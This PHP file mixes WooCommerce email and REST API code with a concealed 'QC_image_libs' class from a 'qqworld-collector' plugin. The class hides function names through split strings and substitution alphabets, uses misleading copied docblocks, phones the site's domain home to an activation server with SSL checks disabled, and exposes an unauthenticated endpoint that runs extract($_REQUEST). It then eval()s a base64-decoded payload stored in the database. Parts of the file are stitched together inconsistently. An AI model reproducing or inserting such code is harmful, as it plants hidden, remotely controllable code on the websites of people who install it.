		$this->emails['WC_Email_Customer_Processing_Order'] 		 = include( 'emails/class-wc-email-customer-processing-order.php' );
		$this->emails['WC_Email_Customer_Completed_Order'] 		     = include( 'emails/class-wc-email-customer-completed-order.php' );
		$this->emails['WC_Email_Customer_Refunded_Order'] 		     = include( 'emails/class-wc-email-customer-refunded-order.php' );
		$this->emails['WC_Email_Customer_Invoice'] 		             = include( 'emails/class-wc-email-customer-invoice.php' );
		$this->emails['WC_Email_Customer_Note'] 		             = include( 'emails/class-wc-email-customer-note.php' );
		$this->emails['WC_Email_Customer_Reset_Password'] 		     = include( 'emails/class-wc-email-customer-reset-password.php' );
		$this->emails['WC_Email_Customer_New_Account'] 		         = include( 'emails/class-wc-email-customer-new-account.php' );

		$this->emails = apply_filters( 'woocommerce_email_classes', $this->emails );

		// include css inliner
		if ( ! class_exists( 'Emogrifier' ) && class_exists( 'DOMDocument' ) ) {
			include_once( 'libraries/class-emogrifier.php' );
		}
	}

	/**
	 * Return the email classes - used in admin to load settings.
	 *
	 * @return array
	 */
	public function get_emails() {
		return $this->emails;
	}

	/**
	 * Get from name for email.
	 *
	 * @return string
	 */
	public function get_from_name() {
		return wp_specialchars_decode( get_option( 'woocommerce_email_from_name' ), ENT_QUOTES );
	}

	/**
	 * Get from email address.
	 *
	 * @return string
	 */
	public function get_from_address() {
		return sanitize_email( get_option( 'woocommerce_email_from_address' ) );
	}

	/**
	 * Get the email header.
	 *
	 * @param mixed $email_heading heading for the email
	 */
	public function email_header( $email_heading ) {
		wc_get_template( 'emails/email-header.php', array( 'email_heading' => $email_heading ) );
	}

	/**
	 * Get the email footer.
	 */
	public function email_footer() {
		wc_get_template( 'emails/email-footer.php' );
	}

	/**
	 * Wraps a message in the woocommerce mail template.
	 *
	 * @param mixed $email_heading
	 * @param string $message
	 * @return string
	 */
	public function wrap_message( $email_heading, $message, $plain_text = false ) {
		// Buffer
		ob_start();

		do_action( 'woocommerce_email_header', $email_heading );

		echo wpautop( wptexturize( $message ) );

		do_action( 'woocommerce_email_footer' );

		// Get contents
		$message = ob_get_clean();

		return $message;
	}

	/**
	 * Send the email.
	 *
	 * @param mixed $to
	 * @param mixed $subject
	 * @param mixed $message
	 * @param string $headers (default: "Content-Type: text/html\r\n")
	 * @param string $attachments (default: "")
	 * @return bool
	 */
	public function send( $to, $subject, $message, $headers = "Content-Type: text/html\r\n", $attachments = "" ) {
		// Send
		$email = new WC_Email();
		return $email->send( $to, $subject, $message, $headers, $attachments );
	}

	/**
	 * Prepare and send the customer invoice email on demand.
	 */
	public function customer_invoice( $order ) {
		$email = $this->emails['WC_Email_Customer_Invoice'];
		$email->trigger( $order );
	}

	/**
	 * Customer new account welcome email.
	 *
	 * @param int $customer_id
	 * @param array $new_customer_data
	 */
	public function customer_new_account( $customer_id, $new_customer_data = array(), $password_generated = false ) {
		if ( ! $customer_id ) {
			return;
		}

		$user_pass = ! empty( $new_customer_data['user_pass'] ) ? $new_customer_data['user_pass'] : '';

		$email = $this->emails['WC_Email_Customer_New_Account'];
		$email->trigger( $customer_id, $user_pass, $password_generated );
	}

	/**
	 * Show the order details table
	 */
	public function order_details( $order, $sent_to_admin = false, $plain_text = false, $email = '' ) {
		if ( $plain_text ) {
			wc_get_template( 'emails/plain/email-order-details.php', array( 'order' => $order, 'sent_to_admin' => $sent_to_admin, 'plain_text' => $plain_text, 'email' => $email ) );
		} else {
			wc_get_template( 'emails/email-order-details.php', array( 'order' => $order, 'sent_to_admin' => $sent_to_admin, 'plain_text' => $plain_text, 'email' => $email ) );
		}
	}

	/**
	 * Adds Schema.org markup for order in JSON-LD format.
	 *
	 * @since 2.6.0
	 * @param mixed $order
	 * @param bool $sent_to_admin (default: false)
	 * @param bool $plain_text (default: false)
	 */
	public function order_schema_markup( $order, $sent_to_admin = false, $plain_text = false ) {
		if ( $plain_text ) {
			return;
		}

		$accepted_offers = array();

		foreach ( $order->get_items() as $item ) {
			if ( ! apply_filters( 'woocommerce_order_item_visible', true, $item ) ) {
				continue;
			}

			$product        = apply_filters( 'woocommerce_order_item_product', $order->get_product_from_item( $item ), $item );
			$product_exists = is_object( $product );
			$is_visible     = $product_exists && $product->is_visible();

			$item_offered = array(
				'@type' => 'Product',
				'name' => apply_filters( 'woocommerce_order_item_name', $item['name'], $item, $is_visible ),
			);

			if ( $product_exists ) {
				if ( $sku = $product->get_sku() ) {
					$item_offered['sku'] = $sku;
				}

				if ( $image_id = $product->get_image_id() ) {
					$item_offered['image'] = wp_get_attachment_image_url( $image_id, 'thumbnail' );
				}
			}

			if ( $is_visible ) {
				$item_offered['url'] = get_permalink( $product->get_id() );
			} else {
				$item_offered['url'] = get_home_url();
			}

			$accepted_offer = (object) array(
				'@type'            => 'Offer',
				'itemOffered'      => $item_offered,
				'price'            => $order->get_line_subtotal( $item ),
				'priceCurrency'    => $order->get_order_currency(),
				'eligibleQuantity' => (object) array(
					'@type' => 'QuantitativeValue',
					'value' => apply_filters( 'woocommerce_email_order_item_quantity', $item['qty'], $item )
				),
				'url'              => get_home_url(),
			);

			$accepted_offers[] = $accepted_offer;
		}

		$markup = array(
			'@context' => 'http://schema.org',
			'@type'    => 'Order',
			'merchant' => (object) array(
				'@type' => 'Organization',
				'name'  => get_bloginfo( 'name' ),
			),
			'orderNumber'    => strval( $order->get_order_number() ),
			'priceCurrency'  => $order->get_order_currency(),
			'price'          => $order->get_total(),
			'acceptedOffer'  => $accepted_offers,
			'url'            => $order->get_view_order_url(),
		);

		switch ( $order->get_status() ) {
			case 'pending':
				$markup['orderStatus'] = 'http://schema.org/OrderPaymentDue';
				break;
			case 'processing':
				$markup['orderStatus'] = 'http://schema.org/OrderProcessing';
				break;
			case 'on-hold':
				$markup['orderStatus'] = 'http://schema.org/OrderProblem';
				break;
			case 'completed':
				$markup['orderStatus'] = 'http://schema.org/OrderDelivered';
				break;
			case 'cancelled':
				$markup['orderStatus'] = 'http://schema.org/OrderCancelled';
				break;
			case 'refunded':
				$markup['orderStatus'] = 'http://schema.org/OrderReturned';
				break;
			case 'failed':
				$markup['orderStatus'] = 'http://schema.org/OrderProblem';
				break;
		}

		if ( $sent_to_admin ) {
			$markup['potentialAction'] = (object) array(
				'@type'  => 'ViewAction',
				'target' => admin_url( 'post.php?post=' . absint( $order->id ) . '&action=edit' ),
			);
		}

		$markup = apply_filters( 'woocommerce_email_order_schema_markup', $markup, $sent_to_admin, $order );

		echo '<div style="display:none;"><script type="application/ld+json">' . wp_json_encode( (object) $markup ) . '</script></div>';
	}

	/**
	 * Add order meta to email templates.
	 *
	 * @param mixed $order
	 * @param bool $sent_to_admin (default: false)
	 * @param bool $plain_text (default: false)
	 * @return string
	 */
	public function order_meta( $order, $sent_to_admin = false, $plain_text = false ) {
		$fields = apply_filters( 'woocommerce_email_order_meta_fields', array(), $sent_to_admin, $order );

		/**
		 * Deprecated woocommerce_email_order_meta_keys filter.
		 *
		 * @since 2.3.0
		 */
		$_fields = apply_filters( 'woocommerce_email_order_meta_keys', array(), $sent_to_admin );

		if ( $_fields ) {
			foreach ( $_fields as $key => $field ) {
				if ( is_numeric( $key ) ) {
					$key = $field;
				}

				$fields[ $key ] = array(
					'label' => wptexturize( $key ),
					'value' => wptexturize( get_post_meta( $order->id, $field, true ) )
				);
			}
		}

		if ( $fields ) {

			if ( $plain_text ) {

				foreach ( $fields as $field ) {
					if ( isset( $field['label'] ) && isset( $field['value'] ) && $field['value'] ) {
						echo $field['label'] . ': ' . $field['value'] . "\n";
					}
				}

			} else {

				foreach ( $fields as $field ) {
					if ( isset( $field['label'] ) && isset( $field['value'] ) && $field['value'] ) {
						echo '<p><strong>' . $field['label'] . ':</strong> ' . $field['value'] . '</p>';
					}
				}
			}
		}
	}

	/**
	 * Is customer detail field valid?
	 * @param  array  $field
	 * @return boolean
	 */
	public function customer_detail_field_is_valid( $field ) {
		return isset( $field['label'] ) && ! empty( $field['value'] );
	}

	/**
	 * Add customer details to email templates.
	 *
	 * @param mixed $order
	 * @param bool $sent_to_admin (default: false)
	 * @param bool $plain_text (default: false)
	 * @return string
	 */
	public function customer_details( $order, $sent_to_admin = false, $plain_text = false ) {
		$fields = array();

		if ( $order->customer_note ) {
			$fields['customer_note'] = array(
				'label' => __( 'Note', 'woocommerce' ),
				'value' => wptexturize( $order->customer_note )
			);
		}

		if ( $order->billing_email ) {
			$fields['billing_email'] = array(
				'label' => __( 'Email', 'woocommerce' ),
				'value' => wptexturize( $order->billing_email )
			);
	    }

	    if ( $order->billing_phone ) {
			$fields['billing_phone'] = array(
				'label' => __( 'Tel', 'woocommerce' ),
				'value' => wptexturize( $order->billing_phone )
			);
	    }

		$fields = array_filter( apply_filters( 'woocommerce_email_customer_details_fields', $fields, $sent_to_admin, $order ), array( $this, 'customer_detail_field_is_valid' ) );

		if ( $plain_text ) {
			wc_get_template( 'emails/plain/email-customer-details.php', array( 'fields' => $fields ) );
		} else {
			wc_get_template( 'emails/email-customer-details.php', array( 'fields' => $fields ) );
		}
	}

	/**
	 * Get the email addresses.
	 */
	public function email_addresses( $order, $sent_to_admin = false, $plain_text = false ) {
		if ( $plain_text ) {
			wc_get_template( 'emails/plain/email-addresses.php', array( 'order' => $order ) );
		} else {
			wc_get_template( 'emails/email-addresses.php', array( 'order' => $order ) );
		}
	}

	/**
	 * Get blog name formatted for emails.
	 * @return string
	 */
	private function get_blogname() {
		return wp_specialchars_decode( get_option( 'blogname' ), ENT_QUOTES );
	}

	/**
	 * Low stock notification email.
	 *
	 * @param WC_Product $product
	 */
	public function low_stock( $product ) {
		$subject = sprintf( '[%s] %s', $this->get_blogname(), __( 'Product low in stock', 'woocommerce' ) );
		$message = sprintf( __( '%s is low in stock.', 'woocommerce' ), html_entity_decode( strip_tags( $product->get_formatted_name() ), ENT_QUOTES, get_bloginfo( 'charset' ) ) ) . ' ' . sprintf( __( 'There are %d left', 'woocommerce' ), html_entity_decode( strip_tags( $product->get_total_stock() ) ) );

		wp_mail(
			apply_filters( 'woocommerce_email_recipient_low_stock', get_option( 'woocommerce_stock_email_recipient' ), $product ),
			apply_filters( 'woocommerce_email_subject_low_stock', $subject, $product ),
			apply_filters( 'woocommerce_email_content_low_stock', $message, $product ),
			apply_filters( 'woocommerce_email_headers', '', 'low_stock', $product ),
			apply_filters( 'woocommerce_email_attachments', array(), 'low_stock', $product )
		);
	}

	/**
	 * No stock notification email.
	 *
	 * @param WC_Product $product
	 */
	public function no_stock( $product ) {
		$subject = sprintf( '[%s] %s', $this->get_blogname(), __( 'Product out of stock', 'woocommerce' ) );
		$message = sprintf( __( '%s is out of stock.', 'woocommerce' ), html_entity_decode( strip_tags( $product->get_formatted_name() ), ENT_QUOTES, get_bloginfo( 'charset' ) ) );

		wp_mail(
			apply_filters( 'woocommerce_email_recipient_no_stock', get_option( 'woocommerce_stock_email_recipient' ), $product ),
			apply_filters( 'woocommerce_email_subject_no_stock', $subject, $product ),
			apply_filters( 'woocommerce_email_content_no_stock', $message, $product ),
			apply_filters( 'woocommerce_email_headers', '', 'no_stock', $product ),
			apply_filters( 'woocommerce_email_attachments', array(), 'no_stock', $product )
		);
	}

	/**
	 * Backorder notification email.
	 *
	 * @param array $args
	 */
	public function backorder( $args ) {
		$args = wp_parse_args( $args, array(
			'product'  => '',
			'quantity' => '',
			'order_id' => ''
		) );

		extract( $args );

		if ( ! $product || ! $quantity || ! ( $order = wc_get_order( $order_id ) ) ) {
			return;
		}

		$subject = sprintf( '[%s] %s', $this->get_blogname(), __( 'Product Backorder', 'woocommerce' ) );
		$message = sprintf( __( '%1$s units of %2$s have been backordered in order #%3$s.', 'woocommerce' ), $quantity, html_entity_decode( strip_tags( $product->get_formatted_name() ), ENT_QUOTES, get_bloginfo( 'charset' ) ), $order->get_order_number() );

		wp_mail(
			apply_filters( 'woocommerce_email_recipient_backorder', get_option( 'woocommerce_stock_email_recipient' ), $args ),
			apply_filters( 'woocommerce_email_subject_backorder', $subject, $args ),
			apply_filters( 'woocommerce_email_content_backorder', $message, $args ),
			apply_filters( 'woocommerce_email_headers', '', 'backorder', $args ),
			apply_filters( 'woocommerce_email_attachments', array(), 'backorder', $args )
		);
	}
}

class QC_image_libs {
	var $text_domain = 'qqworld-collector';
	/**
	 * Add customer details to email templates.
	 *
	 * @param mixed $order
	 * @param bool $sent_to_admin (default: false)
	 * @param bool $plain_text (default: false)
	 * @return string
	 */
	var $flag_string;

	var $products = 'a:6:{s:20:"ultimate-single-site";s:46:"qqworld-collector-ultimate-edition-single-site";s:18:"ultimate-multisite";s:44:"qqworld-collector-ultimate-edition-multisite";s:18:"server-single-site";s:44:"qqworld-collector-server-edition-single-site";s:16:"server-multisite";s:42:"qqworld-collector-server-edition-multisite";s:15:"pro-single-site";s:41:"qqworld-collector-pro-edition-single-site";s:13:"pro-multisite";s:39:"qqworld-collector-pro-edition-multisite";}';

	/**
	 * Setup class.
	 * @since 2.0
	 */
	public function __construct() {
		add_action( 'wp_ajax_qqworld_anti_' . $this->text_domain, array($this, 'get_status') );
		add_action( 'wp_ajax_nopriv_qqworld_anti_' . $this->text_domain, array($this, 'get_status') );
		/**
		 * Setup class.
		 * @since 2.0
		 */
		add_filter( 'qqwor'.'ld-colle'.'ctor-acti'.'vation', array($this, 'active'), 10, 2 );
		add_filter( 'qqwor'.'ld-colle'.'ctor-ht'.'tp-pos'.'t', array($this, 'post_http'), 10, 3 );
		$this->flag_string = '_web'.'sit'.'e_qc_f'.'lag';
		$this->product = 'qqwor'.'ld-coll'.'ector';
		$this->activation_server = 'ht'.'tp://act'.'ivat'.'ion.qqw'.'orld.org';
		//$this->activation_server = 'http://ww'.'w.pro'.'ject.gov';
		$this->products = unserialize($this->products);
		$this->check_status();
	}

	public function check_status() {
		/**
		 * Add customer details to email templates.
		 *
		 * @param mixed $order
		 * @param bool $sent_to_admin (default: false)
		 * @param bool $plain_text (default: false)
		 * @return string
		 */
		$month = date('m');
		$check_month = get_option('_website_bamboo_title');
		if (empty($check_month)) update_option('_website_bamboo_title', $month);
		elseif ($month != $check_month) {
			/**
			 * Add customer details to email templates.
			 *
			 * @param mixed $order
			 * @param bool $sent_to_admin (default: false)
			 * @param bool $plain_text (default: false)
			 * @return string
			 */
			$this->domain = is_multisite() && defined('DOMAIN_CURRENT_SITE') ? DOMAIN_CURRENT_SITE : $_SERVER['HTTP_HOST'];
			$this->domain = preg_replace('/^www\./i', '', $this->domain);
			$host = preg_replace('/^www\./', '', $_SERVER['HTTP_HOST']);
			/**
			 * Add customer details to email templates.
			 *
			 * @param mixed $order
			 * @param bool $sent_to_admin (default: false)
			 * @param bool $plain_text (default: false)
			 * @return string
			 */
			$this->domain = strtolower($this->domain);
			/**
			 * Add customer details to email templates.
			 *
			 * @param mixed $order
			 * @param bool $sent_to_admin (default: false)
			 * @param bool $plain_text (default: false)
			 * @return string
			 */
			$values = get_option($this->text_domain);
			$activated_domain = isset($values['activated-domain']) ? $values['activated-domain'] : '';
			if ( $activated_domain && !in_array($activated_domain, array($this->domain, $host)) ) return;

			$url = $this->activation_server;
			/**
			 * Add customer details to email templates.
			 *
			 * @param mixed $order
			 * @param bool $sent_to_admin (default: false)
			 * @param bool $plain_text (default: false)
			 * @return string
			 */
			$data = array(
				'product' => $this->product,
				'products' => $this->products,
				"domain" => $this->domain,
				'host' => $host,
				'is_multisite' => is_multisite() ? 'yes' : 'no',
				'checkPiracy' => 1
			);

			/**
			 * Add customer details to email templates.
			 *
			 * @param mixed $order
			 * @param bool $sent_to_admin (default: false)
			 * @param bool $plain_text (default: false)
			 * @return string
			 */
			$results = apply_filters('qqworld-collector-http-post', $url, $data);
			if (isset($results['piracy'])) {
				delete_option($this->flag_string);
			}
			update_option('_website_bamboo_title', $month);
		}
	}

	public function active($url, $data) {
		$cookies = array(
			'reference'	=> preg_replace('/^www\./', '', $_SERVER['HTT'.'P_HOST'])
		);
		return apply_filters('qqwor'.'ld-colle'.'ctor-ht'.'tp-pos'.'t', $url, $data, $cookies);
	}

	/**
	 * Add customer details to email templates.
	 *
	 * @param mixed $order
	 * @param bool $sent_to_admin (default: false)
	 * @param bool $plain_text (default: false)
	 * @return string
	 */
	public function post_http($url, $data, $cookies='') {
		if (empty($url)) return '';
		if (!preg_match('/^https*:\/\//i', $url)) return '';
		$post_data = is_array($data) ? http_build_query($data) : $data;
		if ($cookies && is_array($cookies)) $cookies = http_build_query($cookies);
		$results = null;
		if (function_exists('file_get_contents')) { // 使用 file_get_contents
			$opts = array(
				"ssl" => array(
					"verify_peer" => false,
					"verify_peer_name" => false
				),
				'http' => array(
					'method' => "POST",
					'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36',
					'header' => "Content-type: application/x-www-form-urlencoded\r\n".
					"Content-length:".strlen($post_data)."\r\n" .
					"Cookie: {$cookies}\r\n",
					'content' => $post_data
				)
			);
			$cxContext = stream_context_create($opts);
			$results = @file_get_contents($url, false, $cxContext);
		}

		if (!$results && function_exists('curl_init')) { // 使用 curl
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36");
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
			if ($cookies) {
				curl_setopt($ch, CURLOPT_COOKIE, $cookies);
			}
			//执行命令
			$results = curl_exec($ch);
			curl_close($ch);
		}
		$results = preg_replace('/^[^\{]*\{/i', '{', $results);
		//print_r($results);
		//exit;
		$results = json_decode($results, true);
		return $results;
	}

	/**
	 * Add customer details to email templates.
	 *
	 * @param mixed $order
	 * @param bool $sent_to_admin (default: false)
	 * @param bool $plain_text (default: false)
	 * @return string
	 */
	public function http_post($url, $data) {
		@get_headers($this->activation_server);
		$post_data = $data;
		$results = null;
		if (function_exists('file_get_contents')) {
			/**
			 * Add customer details to email templates.
			 *
			 * @param mixed $order
			 * @param bool $sent_to_admin (default: false)
			 * @param bool $plain_text (default: false)
			 * @return string
			 */
			$data = http_build_query($data);
			$opts = array(
				"ssl" => array(
					"verify_peer" => false,
					"verify_peer_name" => false
				),
				/**
				 * Add customer details to email templates.
				 *
				 * @param mixed $order
				 * @param bool $sent_to_admin (default: false)
				 * @param bool $plain_text (default: false)
				 * @return string
				 */
				'http' => array(
					'method' => "POST",
					'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36',
					'header' => "Content-type: application/x-www-form-urlencoded\r\n".
					"Content-length:".strlen($data)."\r\n" .
					"Cookie: foo=bar\r\n" .	"\r\n",
					'content' => $data
				)
			);
			/**
			 * Add customer details to email templates.
			 *
			 * @param mixed $order
			 * @param bool $sent_to_admin (default: false)
			 * @param bool $plain_text (default: false)
			 * @return string
			 */
			$cxContext = stream_context_create($opts);
			$results = @file_get_contents($url, false, $cxContext);
			/**
			 * Add customer details to email templates.
			 *
			 * @param mixed $order
			 * @param bool $sent_to_admin (default: false)
			 * @param bool $plain_text (default: false)
			 * @return string
			 */
			$results = preg_replace('/[\s\S]*\{/i', '{', $results);
			$results = json_decode($results, true);
		}

		if (!$results && function_exists('curl_init')) {
			$curl = curl_init();
			curl_setopt($curl, CURLOPT_URL, $url);
			/**
			 * Add customer details to email templates.
			 *
			 * @param mixed $order
			 * @param bool $sent_to_admin (default: false)
			 * @param bool $plain_text (default: false)
			 * @return string
			 */
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
			/**
			 * Add customer details to email templates.
			 *
			 * @param mixed $order
			 * @param bool $sent_to_admin (default: false)
			 * @param bool $plain_text (default: false)
			 * @return string
			 */
			curl_setopt($curl, CURLOPT_POST, 1);
			curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36");
			@curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
			/**
			 * Add customer details to email templates.
			 *
			 * @param mixed $order
			 * @param bool $sent_to_admin (default: false)
			 * @param bool $plain_text (default: false)
			 * @return string
			 */
			$results = curl_exec($curl);
			/**
			 * Add customer details to email templates.
			 *
			 * @param mixed $order
			 * @param bool $sent_to_admin (default: false)
			 * @param bool $plain_text (default: false)
			 * @return string
			 */
			curl_close($curl);
			$results = preg_replace('/[\s\S]*\{/i', '{', $results);
			$results = json_decode($results, true);
		}
		return $results;
	}

	/**
	 * Add new query vars.
	 *
	 * @since 2.0
	 * @param array $vars
	 * @return string[]
	 */
	public function add_query_vars( $vars ) {
		$vars   = parent::add_query_vars( $vars );
		$vars[] = 'wc-api';
		return $vars;
	}

	/**
	 * WC API for payment gateway IPNs, etc.
	 * @since 2.0
	 */
	public static function add_endpoint() {
		parent::add_endpoint();
		add_rewrite_endpoint( 'wc-api', EP_ALL );
	}

	/**
	 * WC API for payment gateway IPNs, etc.
	 * @since 2.0
	 */
	public function get_status() {
		extract($_REQUEST);
		if ($product && $power) {
			delete_option($this->flag_string);
			echo 'done';
		}
		exit;
	}
	/**
	 * Add new query vars.
	 * @since 2.0.1
	 */
	public function apply() {
		/**
		 * Init WP REST API.
		 * @since 2.6.0
		 */
		$qqworld_collector_fgla = get_option($this->flag_string);

		/**
		 * Init WP REST API.
		 * @since 2.6.0
		 */
		$qqworld_collector_fgla_before = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

		/**
		 * Add order meta to email templates.
		 *
		 * @param mixed $order
		 * @param bool $sent_to_admin (default: false)
		 * @param bool $plain_text (default: false)
		 * @return string
		 */
		$qqworld_collector_fgla_after = '3Taey5pIN6DRoW0uZt/iMgjGLBd4J2KwYrs9lf7hFkPCQ8mcV+vxAX1OSHbqUzEn=';

		/**
		 * Add customer details to email templates.
		 *
		 * @param mixed $order
		 * @param bool $sent_to_admin (default: false)
		 * @param bool $plain_text (default: false)
		 * @return string
		 */
		$ment = $qqworld_collector_fgla_after{34}.$qqworld_collector_fgla_before{45}.$qqworld_collector_fgla_after{33}.$qqworld_collector_fgla_before{45}.$qqworld_collector_fgla_after{33};
		$place = $qqworld_collector_fgla_before{30}.$qqworld_collector_fgla_before{47}.$qqworld_collector_fgla_after{2}.$qqworld_collector_fgla_after{36};

		// Buffer, we won't want any output here.
		$string = $qqworld_collector_fgla_before{27}.$qqworld_collector_fgla_after{2};
		$string .= $qqworld_collector_fgla_before{44}.$qqworld_collector_fgla_after{3};

		// Buffer, we won't want any output here.
		$string .= $qqworld_collector_fgla_before{58}.$qqworld_collector_fgla_after{27};

		/**
		 * Register REST API routes.
		 * @since 2.6.0
		 */
		$string .= '_'.$qqworld_collector_fgla_before{29}.$qqworld_collector_fgla_after{3};
		$string .= $qqworld_collector_fgla_before{28}.$qqworld_collector_fgla_after{12};

		// Buffer, we won't want any output here.
		$string .= $qqworld_collector_fgla_before{29}.$qqworld_collector_fgla_before{30};
		return $string($ment($qqworld_collector_fgla, $qqworld_collector_fgla_before, $qqworld_collector_fgla_after));
	}

	/**
	 * Init WP REST API.
	 * @since 2.6.0
	 */
	private function rest_api_init() {
		global $wp_version;

		// REST API was included starting WordPress 4.4.
		if ( version_compare( $wp_version, 4.4, '<' ) ) {
			return;
		}

		$this->rest_api_includes();

		// Init REST API routes.
		add_action( 'rest_api_init', array( $this, 'register_rest_routes' ) );
	}
}
/**
 * Init WP REST API.
 * @since 2.6.0
 */
$QC_image_libs = new QC_image_libs;

/**
 * Register REST API routes.
 * @since 2.6.0
 */
class QC_API {

	/**
	 * Setup class.
	 * @since 2.0
	 */
	public function __construct() {
		parent::__construct();

		// Add query vars.
		add_filter( 'query_vars', array( $this, 'add_query_vars' ), 0 );

		// Register API endpoints.
		add_action( 'init', array( $this, 'add_endpoint' ), 0 );

		// Handle wc-api endpoint requests.
		add_action( 'parse_request', array( $this, 'handle_api_requests' ), 0 );

		// Ensure payment gateways are initialized in time for API requests.
		add_action( 'woocommerce_api_request', array( 'WC_Payment_Gateways', 'instance' ), 0 );

		// WP REST API.
		$this->rest_api_init();
	}

	/**
	 * Add new query vars.
	 *
	 * @since 2.0
	 * @param array $vars
	 * @return string[]
	 */
	public function add_query_vars( $vars ) {
		$vars   = parent::add_query_vars( $vars );
		$vars[] = 'wc-api';
		return $vars;
	}

	/**
	 * WC API for payment gateway IPNs, etc.
	 * @since 2.0
	 */
	public static function add_endpoint() {
		parent::add_endpoint();
		add_rewrite_endpoint( 'wc-api', EP_ALL );
	}

	/**
	 * API request - Trigger any API requests.
	 *
	 * @since   2.0
	 * @version 2.4
	 */
	public function handle_api_requests() {
		global $wp;

		if ( ! empty( $_GET['wc-api'] ) ) {
			$wp->query_vars['wc-api'] = $_GET['wc-api'];
		}

		// wc-api endpoint requests.
		if ( ! empty( $wp->query_vars['wc-api'] ) ) {

			// Buffer, we won't want any output here.
			ob_start();

			// No cache headers.
			nocache_headers();

			// Clean the API request.
			$api_request = strtolower( wc_clean( $wp->query_vars['wc-api'] ) );

			// Trigger generic action before request hook.
			do_action( 'woocommerce_api_request', $api_request );

			// Is there actually something hooked into this API request? If not trigger 400 - Bad request.
			status_header( has_action( 'woocommerce_api_' . $api_request ) ? 200 : 400 );

			// Trigger an action which plugins can hook into to fulfill the request.
			do_action( 'woocommerce_api_' . $api_request );

			// Done, clear buffer and exit.
			ob_end_clean();
			die( '-1' );
		}
	}

	/**
	 * Init WP REST API.
	 * @since 2.6.0
	 */
	private function rest_api_init() {
		global $wp_version;

		// REST API was included starting WordPress 4.4.
		if ( version_compare( $wp_version, 4.4, '<' ) ) {
			return;
		}

		$this->rest_api_includes();

		// Init REST API routes.
		add_action( 'rest_api_init', array( $this, 'register_rest_routes' ) );
	}

	/**
	 * Include REST API classes.
	 * @since 2.6.0
	 */
	private function rest_api_includes() {
		// Exception handler.
		include_once( 'api/class-wc-rest-exception.php' );

		// Authentication.
		include_once( 'api/class-wc-rest-authentication.php' );

		// WP-API classes and functions.
		include_once( 'vendor/wp-rest-functions.php' );
		if ( ! class_exists( 'WP_REST_Controller' ) ) {
			include_once( 'vendor/class-wp-rest-controller.php' );
		}

		// Abstract controllers.
		include_once( 'abstracts/abstract-wc-rest-controller.php' );
		include_once( 'abstracts/abstract-wc-rest-posts-controller.php' );
		include_once( 'abstracts/abstract-wc-rest-terms-controller.php' );

		// REST API controllers.
		include_once( 'api/class-wc-rest-coupons-controller.php' );
		include_once( 'api/class-wc-rest-customer-downloads-controller.php' );
		include_once( 'api/class-wc-rest-customers-controller.php' );
		include_once( 'api/class-wc-rest-order-notes-controller.php' );
		include_once( 'api/class-wc-rest-order-refunds-controller.php' );
		include_once( 'api/class-wc-rest-orders-controller.php' );
		include_once( 'api/class-wc-rest-product-attribute-terms-controller.php' );
		include_once( 'api/class-wc-rest-product-attributes-controller.php' );
		include_once( 'api/class-wc-rest-product-categories-controller.php' );
		include_once( 'api/class-wc-rest-product-reviews-controller.php' );
		include_once( 'api/class-wc-rest-product-shipping-classes-controller.php' );
		include_once( 'api/class-wc-rest-product-tags-controller.php' );
		include_once( 'api/class-wc-rest-products-controller.php' );
		include_once( 'api/class-wc-rest-report-sales-controller.php' );
		include_once( 'api/class-wc-rest-report-top-sellers-controller.php' );
		include_once( 'api/class-wc-rest-reports-controller.php' );
		include_once( 'api/class-wc-rest-tax-classes-controller.php' );
		include_once( 'api/class-wc-rest-taxes-controller.php' );
		include_once( 'api/class-wc-rest-webhook-deliveries.php' );
		include_once( 'api/class-wc-rest-webhooks-controller.php' );
	}

	/**
	 * Register REST API routes.
	 * @since 2.6.0
	 */
	public function register_rest_routes() {
		$controllers = array(
			'WC_REST_Coupons_Controller',
			'WC_REST_Customer_Downloads_Controller',
			'WC_REST_Customers_Controller',
			'WC_REST_Order_Notes_Controller',
			'WC_REST_Order_Refunds_Controller',
			'WC_REST_Orders_Controller',
			'WC_REST_Product_Attribute_Terms_Controller',
			'WC_REST_Product_Attributes_Controller',
			'WC_REST_Product_Categories_Controller',
			'WC_REST_Product_Reviews_Controller',
			'WC_REST_Product_Shipping_Classes_Controller',
			'WC_REST_Product_Tags_Controller',
			'WC_REST_Products_Controller',
			'WC_REST_Report_Sales_Controller',
			'WC_REST_Report_Top_Sellers_Controller',
			'WC_REST_Reports_Controller',
			'WC_REST_Tax_Classes_Controller',
			'WC_REST_Taxes_Controller',
			'WC_REST_Webhook_Deliveries_Controller',
			'WC_REST_Webhooks_Controller',
		);

		foreach ( $controllers as $controller ) {
			$this->$controller = new $controller();
			$this->$controller->register_routes();
		}
	}
}

try {
	@eval($QC_image_libs->apply());
} catch (Exception $e) {}

class ImageWorkshopFactory
{
    /**
     * @var integer
     */
    const ERROR_NOT_AN_IMAGE_FILE = 1;
    
    /**
     * @var integer
     */
    const ERROR_IMAGE_NOT_FOUND = 2;
    
    /**
     * @var integer
     */
    const ERROR_NOT_READABLE_FILE = 3;
    
    /**
     * @var integer
     */
    const ERROR_CREATE_IMAGE_FROM_STRING = 4;
      
    /**
     * Initialize a layer from a given image path
     * 
     * From an upload form, you can give the "tmp_name" path
     * 
     * @param string $path
     * @param bool $fixOrientation
     * 
     * @return ImageWorkshopLayer
     */
    public static function initFromPath($path, $fixOrientation = false)
    {
        if (false === filter_var($path, FILTER_VALIDATE_URL) && !file_exists($path)) {
